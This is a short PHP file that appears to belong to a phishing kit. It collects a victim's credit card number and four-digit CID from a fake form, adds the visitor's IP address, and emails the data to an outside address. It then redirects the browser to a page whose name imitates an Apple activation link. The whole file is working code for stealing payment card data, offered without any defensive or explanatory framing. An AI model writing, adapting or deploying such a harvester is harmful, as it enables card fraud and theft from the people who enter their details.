<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "|Card Number-----: ".$_POST['addCreditCardNumber']."<br>\n";
$bilsmg .= "|4 Digit CID-----: ".$_POST['cid_password']."<br>\n";
;

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "administrator@welcome-en.us";
$bilsub = "Memex CID | From $ip";
$bilhead = "From:Memex Cado <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../action-home.aHR0cHM6Ly93d3cuYXBwbGUuY29tL2F1L3wxYW9zMDk1NTk4M2JlYTg2NGI1ZjlhZDQwZGQzNGM2MWI1ZWJlZDgxMWU4NA-rActivation.Face=en_SG.inav=sg-sitefooter_activate.html";
header("location:$src");
?>